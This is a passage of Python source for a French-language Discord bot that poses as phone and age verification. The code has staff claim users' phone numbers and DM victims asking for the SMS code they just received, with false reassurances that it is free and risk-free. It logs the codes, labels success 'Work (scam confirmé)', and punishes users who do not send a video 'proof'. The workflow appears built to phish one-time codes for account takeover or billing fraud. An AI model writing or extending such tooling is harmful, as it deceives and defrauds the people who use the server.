import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import datetime
import logging
from typing import Optional, Dict
from aiohttp import web

import config
from utils import (
    validate_phone,
    mask_phone,
    validate_code,
    load_blacklist,
    save_blacklist,
    is_user_blacklisted,
    is_phone_blacklisted,
    add_to_blacklist,
    remove_user_blacklist,
    load_setup_data,
    save_setup_data,
    is_video_attachment,
)

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger("VerifBot")

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

cooldowns: Dict[int, float] = {}
pending_verifications: Dict[int, dict] = {}
staff_active_claims: Dict[int, dict] = {}
retry_cooldowns: Dict[int, float] = {}
blacklist = load_blacklist()

# Systeme de proof video
proof_pending: Dict[int, dict] = {}
proof_store: Dict[int, dict] = {}

# Couleurs
SETUP_COLOR = 0x5865f2
SETUP_NSFW_COLOR = 0xff6a00
COLOR_SUCCESS = 0x57f287
COLOR_WARNING = 0xfee75c
COLOR_DANGER = 0xed4245
COLOR_PROOF = 0xffa500

# ===== HEALTH SERVER =====

async def health_handler(request):
    return web.Response(text="OK", status=200)

async def start_health_server():
    app = web.Application()
    app.router.add_get("/", health_handler)
    app.router.add_get("/health", health_handler)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", config.PORT)
    await site.start()
    log.info(f"Health check server on port {config.PORT}")

# ===== BAN / UNBAN =====

async def ban_user(user_id: int, reason: str = "") -> bool:
    guild = bot.get_guild(config.GUILD_ID)
    if not guild:
        return False
    try:
        member = guild.get_member(user_id)
        if member:
            await member.ban(reason=reason, delete_message_days=0)
            return True
        await guild.ban(discord.Object(id=user_id), reason=reason, delete_message_days=0)
        return True
    except Exception:
        return False


async def grant_reject_role(user_id: int, reason: str = "Refus de vérification") -> bool:
    guild = bot.get_guild(config.GUILD_ID)
    if not guild or not config.REJECT_ROLE_ID:
        return False

    member = guild.get_member(user_id)
    if not member:
        return False

    role = guild.get_role(config.REJECT_ROLE_ID)
    if not role:
        return False

    if role in member.roles:
        return True

    try:
        await member.add_roles(role, reason=reason)
        return True
    except Exception:
        return False


async def has_bypass_role(user_id: int) -> bool:
    for guild in bot.guilds:
        member = guild.get_member(user_id)
        if member and any(role.id == config.BYPASS_ROLE_ID for role in member.roles):
            return True
    return False

# ===== STAFF CLAIM VIEW =====

class StaffClaimView(discord.ui.View):
    def __init__(self, phone: str, user_id: int, parent_view: "StaffPanelView"):
        super().__init__(timeout=None)
        self.phone = phone
        self.user_id = user_id
        self.parent_view = parent_view

    @discord.ui.button(label="📋 Copier le numéro", style=discord.ButtonStyle.secondary, custom_id="copy_phone_btn")
    async def copy_phone(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message(
            f"📱 **Numéro :** `{self.phone}`",
            ephemeral=True
        )

    @discord.ui.button(label="Fermer", style=discord.ButtonStyle.danger, custom_id="claim_close_btn")
    async def claim_close(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.parent_view.closed:
            embed = discord.Embed(title="Déjà fermé", color=COLOR_WARNING)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        if self.parent_view.claimed_by and self.parent_view.claimed_by != interaction.user.id:
            embed = discord.Embed(
                title="Action impossible",
                description="Seul le staff qui a pris en charge peut fermer.",
                color=COLOR_DANGER
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        await self.parent_view.close_ticket(
            "Fermé - refus",
            do_ban=True,
            reason="Fermé depuis le panneau staff"
        )
        embed = discord.Embed(
            title="Vérification fermée",
            description=f"L'utilisateur <@{self.user_id}> a été marqué refusé et le numéro blacklisté.",
            color=COLOR_DANGER
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)

# ===== PROOF BAN MODAL =====

class ProofBanModal(discord.ui.Modal, title="Refuser un utilisateur"):
    user_id_input = discord.ui.TextInput(
        label="ID de l'utilisateur",
        placeholder="Entrez l'ID Discord",
        min_length=10,
        max_length=30,
        required=True,
    )
    phone_input = discord.ui.TextInput(
        label="Numéro de téléphone",
        placeholder="0612345678",
        min_length=10,
        max_length=10,
        required=True,
    )

    async def on_submit(self, interaction: discord.Interaction):
        try:
            target_id = int(self.user_id_input.value.strip())
        except Exception:
            embed = discord.Embed(title="ID invalide", color=COLOR_DANGER)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        phone = self.phone_input.value.strip().replace(" ", "").replace("-", "")
        add_to_blacklist(target_id, phone, blacklist)
        await grant_reject_role(target_id, reason="Refus via preuve scam")
        embed = discord.Embed(
            title="Utilisateur refusé",
            description=f"**ID :** `{target_id}`\n**Numéro :** `{mask_phone(phone)}`\n**Rôle de refus attribué :** Oui",
            color=COLOR_DANGER
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)

# ===== PROOF VIEW =====

class ProofView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Oui c'est legit", style=discord.ButtonStyle.success, custom_id="proof_yes")
    async def yes_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed = discord.Embed(title="Vote enregistré", description="Merci pour votre vote.", color=COLOR_SUCCESS)
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label="Non c'est du scam", style=discord.ButtonStyle.danger, custom_id="proof_no")
    async def no_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(ProofBanModal())

# ===== VALIDATION CHANNEL VIEW =====

class ValidationChannelView(discord.ui.View):
    def __init__(self, user_id: int, phone: str):
        super().__init__(timeout=None)
        self.user_id = user_id
        self.phone = phone

    @discord.ui.button(label="Valider", style=discord.ButtonStyle.success, custom_id="val_validate")
    async def val_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if is_user_blacklisted(self.user_id, blacklist):
            embed = discord.Embed(title="Déjà blacklisté", color=COLOR_WARNING)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        add_to_blacklist(self.user_id, self.phone, blacklist)
        await grant_reject_role(self.user_id, reason="Scam confirmé via validation")
        for child in self.children:
            if isinstance(child, discord.ui.Button):
                child.disabled = True

        embed = discord.Embed(
            title="Scam validé",
            description=f"<@{self.user_id}> marqué refusé et blacklisté.",
            color=COLOR_DANGER
        )
        await interaction.response.edit_message(embed=interaction.message.embeds[0], view=self)
        await interaction.followup.send(embed=embed, ephemeral=True)

    @discord.ui.button(label="Fermer", style=discord.ButtonStyle.danger, custom_id="val_close")
    async def close_val_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if is_user_blacklisted(self.user_id, blacklist):
            embed = discord.Embed(title="Déjà blacklisté", color=COLOR_WARNING)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        add_to_blacklist(self.user_id, self.phone, blacklist)
        await grant_reject_role(self.user_id, reason="Fermeture validation - refus du membre")
        for child in self.children:
            if isinstance(child, discord.ui.Button):
                child.disabled = True

        embed = discord.Embed(
            title="Ticket fermé",
            description=f"<@{self.user_id}> marqué refusé et blacklisté.",
            color=COLOR_DANGER
        )
        await interaction.response.edit_message(embed=interaction.message.embeds[0], view=self)
        await interaction.followup.send(embed=embed, ephemeral=True)

# ===== PHONE MODAL =====

class PhoneModal(discord.ui.Modal, title="Vérification téléphone"):
    phone = discord.ui.TextInput(
        label="Numéro de téléphone",
        placeholder="0612345678",
        min_length=10,
        max_length=10,
        required=True,
    )

    async def on_submit(self, interaction: discord.Interaction):
        if await has_bypass_role(interaction.user.id):
            embed = discord.Embed(
                title="Accès direct autorisé",
                description="Vous avez déjà un rôle de bypass. Aucune vérification supplémentaire n'est nécessaire.",
                color=COLOR_SUCCESS
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        now = datetime.datetime.now().timestamp()
        if interaction.user.id in cooldowns:
            remaining = cooldowns[interaction.user.id] + config.COOLDOWN_SECONDS - now
            if remaining > 0:
                embed = discord.Embed(
                    title="Cooldown actif",
                    description=f"Veuillez attendre {int(remaining)} secondes avant de réessayer.",
                    color=COLOR_WARNING
                )
                await interaction.response.send_message(embed=embed, ephemeral=True)
                return

        if interaction.user.id in pending_verifications:
            embed = discord.Embed(
                title="Déjà en cours",
                description="Vous avez déjà une vérification en attente.",
                color=COLOR_WARNING
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        if is_user_blacklisted(interaction.user.id, blacklist):
            embed = discord.Embed(
                title="Accès refusé",
                description="Vous êtes blacklisté.",
                color=COLOR_DANGER
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        phone_raw = self.phone.value.strip().replace(" ", "").replace("-", "")
        if is_phone_blacklisted(phone_raw, blacklist):
            embed = discord.Embed(
                title="Numéro blacklisté",
                description="Ce numéro est blacklisté.",
                color=COLOR_DANGER
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        valid, err_msg = validate_phone(phone_raw)
        if not valid:
            embed = discord.Embed(
                title="Numéro invalide",
                description=err_msg,
                color=COLOR_DANGER
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        cooldowns[interaction.user.id] = now
        embed_wait = discord.Embed(
            title="Demande envoyée",
            description="Votre demande a été prise en compte.\n\nUn membre du staff va vous contacter.",
            color=COLOR_SUCCESS
        )
        embed_wait.set_footer(text="Vérification • 0,00 €")
        await interaction.response.send_message(embed=embed_wait, ephemeral=True)
        await send_staff_panel(interaction.user, phone_raw)

# ===== BUILD STAFF EMBED =====

def build_staff_embed(user: discord.User, phone: str, status: str = "En attente", claimed_by: Optional[int] = None, code_requested: bool = False, timestamp: Optional[datetime.datetime] = None) -> discord.Embed:
    if timestamp is None:
        timestamp = datetime.datetime.now()

    embed = discord.Embed(title="NOUVELLE DEMANDE DE VÉRIFICATION", color=0x5865f2, timestamp=timestamp)
    embed.set_thumbnail(url=user.display_avatar.url)
    embed.add_field(name="Utilisateur", value=f"{user.mention}", inline=True)
    embed.add_field(name="ID", value=f"`{user.id}`", inline=True)
    embed.add_field(name="Numéro", value=f"`{mask_phone(phone)}`", inline=True)
    embed.add_field(name="Statut", value=status, inline=True)
    embed.add_field(name="Code demandé", value="Oui" if code_requested else "Non", inline=True)
    embed.add_field(name="Pris par", value=f"<@{claimed_by}>" if claimed_by else "*Personne*", inline=False)
    embed.set_footer(text=datetime.datetime.now().strftime("%d/%m/%Y %H:%M") + " • Vérification")
    return embed

# ===== STAFF PANEL VIEW =====

class StaffPanelView(discord.ui.View):
    def __init__(self, user_id: int, phone: str):
        super().__init__(timeout=None)
        self.user_id = user_id
        self.phone = phone
        self.claimed_by: Optional[int] = None
        self.code_requested = False
        self.closed = False
        self.message: Optional[discord.Message] = None
        self.auto_close_task: Optional[asyncio.Task] = None
        self.claim_view: Optional[StaffClaimView] = None

    async def close_ticket(self, status_text: str = "Fermé", do_ban: bool = True, reason: str = "Vérification fermée"):
        pending_verifications.pop(self.user_id, None)
        cooldowns.pop(self.user_id, None)

        if self.claimed_by and self.claimed_by in staff_active_claims:
            staff_active_claims.pop(self.claimed_by, None)

        self.closed = True

        if do_ban and self.user_id:
            add_to_blacklist(self.user_id, self.phone, blacklist)
            await grant_reject_role(self.user_id, reason=reason)

        if self.auto_close_task:
            self.auto_close_task.cancel()
            self.auto_close_task = None

        for child in self.children:
            if isinstance(child, discord.ui.Button):
                child.disabled = True

        try:
            user_fetch = await bot.fetch_user(self.user_id)
            new_embed = build_staff_embed(
                user=user_fetch,
                phone=self.phone,
                status=status_text,
                claimed_by=self.claimed_by,
                code_requested=self.code_requested,
                timestamp=self.message.created_at if self.message else None
            )
            new_embed.set_thumbnail(url=user_fetch.display_avatar.url)
            new_embed.color = COLOR_DANGER
            await self.message.edit(embed=new_embed, view=self)
        except Exception:
            pass

    async def start_auto_close(self):
        try:
            await asyncio.sleep(300)
            if not self.closed and not self.code_requested and self.claimed_by is not None:
                await self.close_ticket("Fermé automatiquement (5 min)", do_ban=False)
        except asyncio.CancelledError:
            pass

    @discord.ui.button(label="Prendre en charge", style=discord.ButtonStyle.primary, custom_id="claim_btn")
    async def claim_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.claimed_by is not None:
            embed = discord.Embed(
                title="Déjà pris",
                description=f"Un member du staff est déjà sur le coup (<@{self.claimed_by}>).",
                color=COLOR_DANGER
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        if self.closed:
            embed = discord.Embed(
                title="Fermé",
                description="Cette vérification est déjà fermée.",
                color=COLOR_DANGER
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        staff_id = interaction.user.id
        if staff_id in staff_active_claims:
            old_data = staff_active_claims[staff_id]
            try:
                old_view = old_data["view"]
                await old_view.close_ticket("Fermé (nouveau claim)", do_ban=False)
            except Exception:
                pass

        staff_active_claims[staff_id] = {"view": self, "user_id": self.user_id}
        self.claimed_by = staff_id

        embed_reveal = discord.Embed(
            title="🔓 Numéro débloqué",
            description=f"```\n{self.phone}\n```\n*Cliquez sur « 📋 Copier » pour copier facilement.*",
            color=COLOR_SUCCESS,
            timestamp=datetime.datetime.now()
        )
        embed_reveal.set_footer(text="Ne partagez pas ce numéro")
        self.claim_view = StaffClaimView(self.phone, self.user_id, self)
        await interaction.response.send_message(embed=embed_reveal, view=self.claim_view, ephemeral=True)

        user_fetch = await bot.fetch_user(self.user_id)
        new_embed = build_staff_embed(
            user=user_fetch,
            phone=self.phone,
            status="En cours",
            claimed_by=self.claimed_by,
            code_requested=self.code_requested,
            timestamp=interaction.message.created_at
        )
        new_embed.set_thumbnail(url=user_fetch.display_avatar.url)
        await interaction.message.edit(embed=new_embed, view=self)
        self.auto_close_task = asyncio.create_task(self.start_auto_close())

    @discord.ui.button(label="Demander le code", style=discord.ButtonStyle.success, custom_id="request_code_btn")
    async def request_code_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.claimed_by is None:
            embed = discord.Embed(
                title="Action impossible",
                description="Prenez d'abord la vérification en charge.",
                color=COLOR_WARNING
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        if self.claimed_by != interaction.user.id:
            embed = discord.Embed(
                title="Action impossible",
                description=f"Seul <@{self.claimed_by}> peut demander le code.",
                color=COLOR_DANGER
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        if self.code_requested:
            embed = discord.Embed(
                title="Déjà demandé",
                description="Le code a déjà été demandé à cet utilisateur.",
                color=COLOR_WARNING
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        if self.closed:
            embed = discord.Embed(
                title="Fermé",
                description="Cette vérification est fermée.",
                color=COLOR_DANGER
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        if self.auto_close_task:
            self.auto_close_task.cancel()
            self.auto_close_task = None

        self.code_requested = True
        pending_verifications[self.user_id] = {
            "phone": self.phone,
            "claimed_by": interaction.user.id
        }

        embed_confirm = discord.Embed(
            title="Message envoyé",
            description="Un message a été envoyé à l'utilisateur pour demander le code.",
            color=COLOR_SUCCESS,
            timestamp=datetime.datetime.now()
        )
        await interaction.response.send_message(embed=embed_confirm, ephemeral=True)

        # Log dans le salon de logs
        log_channel = bot.get_channel(config.LOG_CHANNEL_ID)
        if log_channel:
            embed_log = discord.Embed(
                title="CODE DEMANDÉ",
                description="Code demandé pour un utilisateur.",
                color=COLOR_WARNING,
                timestamp=datetime.datetime.now()
            )
            embed_log.add_field(name="Staff", value=f"<@{interaction.user.id}>", inline=True)
            embed_log.add_field(name="Utilisateur", value=f"<@{self.user_id}> (`{self.user_id}`)", inline=True)
            embed_log.add_field(name="Numéro", value=f"||{self.phone}||", inline=True)
            embed_log.add_field(name="Date", value=datetime.datetime.now().strftime("%d/%m/%Y %H:%M"), inline=True)
            embed_log.set_footer(text="Logs de vérification")
            await log_channel.send(embed=embed_log)

        # Envoyer le DM à l'utilisateur
        try:
            user = await bot.fetch_user(self.user_id)
            embed_dm = discord.Embed(
                title="Code de vérification",
                description=(
                    "Votre vérification est en cours.\n\n"
                    "Pour confirmer votre âge et votre numéro de téléphone, "
                    "veuillez répondre à ce message avec le code à 4 chiffres reçu par SMS.\n\n"
                    "Ce processus est uniquement destiné à vérifier l'âge et le numéro, "
                    "et ne représente aucun risque pour votre compte."
                ),
                color=0x5865f2
            )
            embed_dm.set_footer(text="Répondez avec le code • 0,00 €")
            await user.send(embed=embed_dm)
        except discord.Forbidden:
            embed_fail = discord.Embed(
                title="Erreur",
                description=f"<@{self.user_id}> a ses MP fermés. Contactez-le manuellement.",
                color=COLOR_DANGER
            )
            await interaction.followup.send(embed=embed_fail, ephemeral=True)
            pending_verifications.pop(self.user_id, None)
            self.code_requested = False
            return

        user_fetch = await bot.fetch_user(self.user_id)
        new_embed = build_staff_embed(
            user=user_fetch,
            phone=self.phone,
            status="Code demandé - en attente",
            claimed_by=self.claimed_by,
            code_requested=True,
            timestamp=interaction.message.created_at
        )
        new_embed.set_thumbnail(url=user_fetch.display_avatar.url)
        await interaction.message.edit(embed=new_embed, view=self)

    @discord.ui.button(label="✅ Work (scam confirmé)", style=discord.ButtonStyle.danger, custom_id="work_btn")
    async def work_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.claimed_by is None:
            embed = discord.Embed(
                title="Action impossible",
                description="Prenez d'abord la vérification en charge.",
                color=COLOR_WARNING
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        if self.claimed_by != interaction.user.id:
            embed = discord.Embed(
                title="Action impossible",
                description=f"Seul <@{self.claimed_by}> peut utiliser ce bouton.",
                color=COLOR_DANGER
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        if self.closed:
            embed = discord.Embed(
                title="Déjà fermé",
                description="Cette vérification est déjà fermée.",
                color=COLOR_WARNING
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        await self.close_ticket(
            "Scam confirmé - refus",
            do_ban=True,
            reason="Scam confirmé par le staff"
        )
        embed = discord.Embed(
            title="Scam confirmé",
            description=f"L'utilisateur <@{self.user_id}> a été refusé et le numéro blacklisté.",
            color=COLOR_DANGER
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label="Fermer", style=discord.ButtonStyle.grey, custom_id="close_btn")
    async def close_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.claimed_by is not None and self.claimed_by != interaction.user.id:
            embed = discord.Embed(
                title="Action impossible",
                description=f"Seul <@{self.claimed_by}> peut fermer cette vérification.",
                color=COLOR_DANGER
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        if self.closed:
            embed = discord.Embed(
                title="Déjà fermé",
                description="Cette vérification est déjà fermée.",
                color=COLOR_WARNING
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        await self.close_ticket(
            "Refusé - rôle attribué",
            do_ban=True,
            reason="Refus de vérification + rôle de refus"
        )
        embed = discord.Embed(
            title="Vérification fermée",
            description=f"L'utilisateur <@{self.user_id}> a été refusé et le numéro blacklisté.",
            color=COLOR_DANGER
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)

# ===== ENVOYER PANEL STAFF =====

async def send_staff_panel(user: discord.User, phone: str):
    guild = bot.get_guild(config.STAFF_GUILD_ID)
    if not guild:
        log.error(f"Staff guild {config.STAFF_GUILD_ID} introuvable.")
        return

    channel = guild.get_channel(config.STAFF_CHANNEL_ID)
    if not channel:
        log.error(f"Staff channel {config.STAFF_CHANNEL_ID} introuvable.")
        return

    view = StaffPanelView(user.id, phone)
    embed = build_staff_embed(user=user, phone=phone, status="En attente", claimed_by=None, code_requested=False)
    embed.set_thumbnail(url=user.display_avatar.url)
    msg = await channel.send(content="@everyone", embed=embed, view=view)
    view.message = msg

# ===== VALIDATION CHANNEL =====

async def send_validation_channel_message(user: discord.User, phone: str, code: str, claimed_by: int):
    validation_channel = bot.get_channel(config.VALIDATION_CHANNEL_ID)
    if not validation_channel:
        return

    embed_val = discord.Embed(
        title="CODE DE VÉRIFICATION VALIDE",
        description=f"```\n  {code}  \n```",
        color=COLOR_SUCCESS,
        timestamp=datetime.datetime.now()
    )
    embed_val.add_field(name="Numéro", value=f"`{phone[:2]}******{phone[-2:]}`", inline=True)
    embed_val.add_field(name="Utilisateur", value=f"{user.mention}", inline=True)
    embed_val.add_field(name="Validé le", value=datetime.datetime.now().strftime("%d/%m/%Y %H:%M"), inline=False)
    embed_val.set_footer(text="Vérification validée")
    view = ValidationChannelView(user.id, phone)
    await validation_channel.send(content=f"<@{claimed_by}>", embed=embed_val, view=view)

# ===== PROOF VIDEO SYSTEM =====

async def start_proof_procedure(user: discord.User, phone: str, code: str):
    if config.PROOF_CHANNEL_ID == 0:
        return

    channel = bot.get_channel(config.PROOF_CHANNEL_ID)
    if not channel:
        log.warning("PROOF_CHANNEL_ID introuvable.")
        return

    proof_pending[user.id] = {
        "phone": phone,
        "code": code,
        "started_at": datetime.datetime.now(),
        "done": False,
        "message_id": None,
    }

    embed = discord.Embed(
        title="PREUVE OBLIGATOIRE - 5 MIN",
        description=(
            "Vous devez envoyer une vidéo dans ce salon pour valider votre preuve.\n\n"
            "Règles :\n"
            "• uniquement une vidéo\n"
            "• aucune photo\n"
            "• aucun message texte\n"
            "• 5 minutes maximum pour envoyer la preuve\n\n"
            "Si aucune vidéo n'est envoyée dans le délai, le membre sera refusé et la vérification sera annulée."
        ),
        color=COLOR_PROOF,
        timestamp=datetime.datetime.now()
    )
    embed.add_field(name="Utilisateur", value=f"<@{user.id}>", inline=True)
    embed.add_field(name="Numéro", value=f"`{mask_phone(phone)}`", inline=True)
    embed.add_field(name="Code reçu", value=f"`{code}`", inline=True)
    embed.set_footer(text="Délai : 5 minutes")
    msg = await channel.send(content=f"<@{user.id}>", embed=embed)
    proof_pending[user.id]["message_id"] = msg.id

    asyncio.create_task(proof_timeout_task(user.id))


async def proof_timeout_task(user_id: int):
    await asyncio.sleep(config.PROOF_TIMEOUT_SECONDS)

    pending = proof_pending.get(user_id)
    if not pending or pending.get("done", False):
        return

    phone = pending.get("phone", "inconnu")
    code = pending.get("code", "inconnu")

    add_to_blacklist(user_id, phone, blacklist)
    await grant_reject_role(user_id, reason="Preuve non envoyée dans le délai")

    try:
        user = await bot.fetch_user(user_id)
        embed = discord.Embed(
            title="Preuve non reçue",
            description=(
                "Votre preuve n'a pas été envoyée dans le délai demandé.\n\n"
                "La vérification est refusée et votre numéro est blacklisté. "
                "Cela sert à confirmer la vérification avec une preuve valable."
            ),
            color=COLOR_DANGER
        )
        await user.send(embed=embed)
    except Exception:
        pass

    channel = bot.get_channel(config.PROOF_CHANNEL_ID)
    if channel:
        embed = discord.Embed(
            title="PREUVE NON ENVOYÉE",
            description=f"<@{user_id}> n’a pas envoyé de vidéo dans le délai de 5 minutes.\nLa preuve est refusée et le membre est marqué refusé.",
            color=COLOR_DANGER,
            timestamp=datetime.datetime.now()
        )
        embed.add_field(name="ID", value=f"`{user_id}`", inline=True)
        embed.add_field(name="Numéro", value=f"`{mask_phone(phone)}`", inline=True)
        embed.add_field(name="Code", value=f"`{code}`", inline=True)
        await channel.send(embed=embed)

    log_channel = bot.get_channel(config.LOG_CHANNEL_ID)
    if log_channel:
        embed_log = discord.Embed(
            title="PREUVE EXPIRÉE",
            description="Aucune vidéo reçue dans le délai.",
            color=COLOR_DANGER,
            timestamp=datetime.datetime.now()
        )
        embed_log.add_field(name="Utilisateur", value=f"<@{user_id}> (`{user_id}`)", inline=True)
        embed_log.add_field(name="Numéro", value=f"`{mask_phone(phone)}`", inline=True)
        embed_log.add_field(name="Code", value=f"`{code}`", inline=True)
        await log_channel.send(embed=embed_log)

    proof_pending.pop(user_id, None)


async def validate_proof_video(user_id: int, attachment):
    pending = proof_pending.get(user_id)
    if not pending:
        return

    phone = pending.get("phone")
    code = pending.get("code")
    pending["done"] = True

    proof_store[user_id] = {
        "user_id": user_id,
        "phone": phone,
        "code": code,
        "filename": attachment.filename,
        "url": attachment.url,
        "channel_id": config.PROOF_CHANNEL_ID,
        "created_at": datetime.datetime.now()
    }

    channel = bot.get_channel(config.PROOF_CHANNEL_ID)
    if channel:
        embed = discord.Embed(
            title="PREUVE VALIDÉE",
            description=f"La preuve de <@{user_id}> a bien été reçue et validée.",
            color=COLOR_SUCCESS,
            timestamp=datetime.datetime.now()
        )
        embed.add_field(name="Numéro", value=f"`{mask_phone(phone)}`", inline=True)
        embed.add_field(name="Code", value=f"`{code}`", inline=True)
        await channel.send(embed=embed)

    log_channel = bot.get_channel(config.LOG_CHANNEL_ID)
    if log_channel:
        embed_log = discord.Embed(
            title="PREUVE VALIDÉE",
            description="Une preuve vidéo a été reçue.",
            color=COLOR_SUCCESS,
            timestamp=datetime.datetime.now()
        )
        embed_log.add_field(name="Utilisateur", value=f"<@{user_id}> (`{user_id}`)", inline=True)
        embed_log.add_field(name="Numéro", value=f"`{mask_phone(phone)}`", inline=True)
        embed_log.add_field(name="Code", value=f"`{code}`", inline=True)
        await log_channel.send(embed=embed_log)

    proof_pending.pop(user_id, None)

# ===== GESTION DM CODE =====

async def handle_dm_code(message: discord.Message):
    user_id = message.author.id
    pending = pending_verifications.get(user_id)
    if pending is None:
        embed = discord.Embed(
            title="Vérification expirée",
            description="Cette vérification a expiré. Vous pouvez utiliser la commande `/retry` pour relancer une demande.\n\nSinon contactez le staff.",
            color=COLOR_DANGER
        )
        await message.channel.send(embed=embed)
        return

    content = message.content.strip()
    valid, err_msg = validate_code(content)
    if not valid:
        embed = discord.Embed(title="Code invalide", description=err_msg, color=COLOR_DANGER)
        await message.channel.send(embed=embed)
        return

    phone = pending["phone"]
    claimed_by = pending.get("claimed_by")
    pending_verifications.pop(user_id, None)

    embed_success = discord.Embed(
        title="Code validé",
        description=(
            "Votre code a bien été validé.\n\n"
            "La vérification de votre âge et de votre numéro a été confirmée.\n\n"
            "Pour finaliser la procédure, vous devez envoyer une vidéo dans le salon de preuve dédié.\n"
            "Cette vidéo est obligatoire et doit être envoyée dans les 5 minutes.\n\n"
            "Aucune photo ni message texte ne sera accepté dans ce salon."
        ),
        color=COLOR_SUCCESS
    )
    embed_success.set_footer(text="Validation de la vérification")
    await message.channel.send(embed=embed_success)
    await send_validation_channel_message(message.author, phone, content, claimed_by)
    await start_proof_procedure(message.author, phone, content)

    log_channel = bot.get_channel(config.LOG_CHANNEL_ID)
    if log_channel:
        embed_log = discord.Embed(
            title="CODE VALIDÉ",
            description="Code validé par un utilisateur.",
            color=COLOR_SUCCESS,
            timestamp=datetime.datetime.now()
        )
        embed_log.add_field(name="Staff", value=f"<@{claimed_by}> (`{claimed_by}`)", inline=True)
        embed_log.add_field(name="Utilisateur", value=f"{message.author.mention} (`{user_id}`)", inline=True)
        embed_log.add_field(name="Numéro", value=f"||{phone}||", inline=True)
        embed_log.add_field(name="Code", value=f"`{content}`", inline=True)
        embed_log.add_field(name="Date", value=datetime.datetime.now().strftime("%d/%m/%Y %H:%M"), inline=True)
        embed_log.set_thumbnail(url=message.author.display_avatar.url)
        embed_log.set_footer(text="Logs de vérification")
        await log_channel.send(embed=embed_log)

    if config.VERIFIED_ROLE_ID and config.GUILD_ID:
        guild = bot.get_guild(config.GUILD_ID)
        if guild:
            role = guild.get_role(config.VERIFIED_ROLE_ID)
            if role:
                member = guild.get_member(user_id)
                if member:
                    try:
                        await member.add_roles(role, reason="Vérification téléphone réussie")
                    except discord.Forbidden:
                        log.warning(f"Permission manquante pour attribuer le rôle vérifié à {user_id}")

    user_fetch = await bot.fetch_user(user_id)
    staff_guild = bot.get_guild(config.STAFF_GUILD_ID)
    if staff_guild:
        staff_channel = staff_guild.get_channel(config.STAFF_CHANNEL_ID)
        if staff_channel:
            async for msg in staff_channel.history(limit=50):
                if msg.embeds:
                    for embed in msg.embeds:
                        for field in embed.fields:
                            if field.value and str(user_id) in field.value:
                                try:
                                    view = discord.ui.View.from_message(msg)
                                    if view:
                                        for child in view.children:
                                            if isinstance(child, discord.ui.Button):
                                                child.disabled = True

                                    new_embed = build_staff_embed(
                                        user=user_fetch,
                                        phone=phone,
                                        status="Vérifié",
                                        claimed_by=claimed_by,
                                        code_requested=True,
                                        timestamp=msg.created_at
                                    )
                                    new_embed.set_thumbnail(url=user_fetch.display_avatar.url)
                                    new_embed.color = COLOR_SUCCESS
                                    await msg.edit(embed=new_embed, view=view)
                                except Exception:
                                    pass
                                break

# ===== BOUTON VÉRIFIER =====

class VerifyButtonView(discord.ui.View):
    def __init__(self, is_nsfw: bool = False):
        super().__init__(timeout=None)
        self.is_nsfw = is_nsfw
        btn_label = "🔞 Vérifier" if is_nsfw else "✅ Vérifier"
        btn = discord.ui.Button(label=btn_label, style=discord.ButtonStyle.success, custom_id="global_verify_btn")
        btn.callback = self._button_callback
        self.add_item(btn)

    async def _button_callback(self, interaction: discord.Interaction):
        await interaction.response.send_modal(PhoneModal())

# ===== COMMANDES SLASH =====

@bot.tree.command(name="setup", description="Crée le panneau de vérification standard dans ce salon")
@app_commands.default_permissions(administrator=True)
async def setup(interaction: discord.Interaction):
    embed = discord.Embed(
        title="VÉRIFICATION OBLIGATOIRE",
        description=(
            "Pour accéder au serveur, vous devez terminer la vérification ci-dessous.\n\n"
            "Cette vérification sert à confirmer votre âge et votre numéro de téléphone.\n"
            "Aucun paiement ne sera demandé.\n\n"
            "Étapes :\n"
            "1. Cliquez sur « ✅ Vérifier »\n"
            "2. Entrez votre numéro de téléphone\n"
            "3. Recevez le code de confirmation\n"
            "4. Répondez par le code à 4 chiffres\n"
            "5. Finalisez la preuve si nécessaire"
        ),
        color=SETUP_COLOR
    )
    embed.set_footer(text="Vérification • 0,00 €")
    view = VerifyButtonView(is_nsfw=False)

    setup_data = load_setup_data()
    existing = None
    for entry in setup_data:
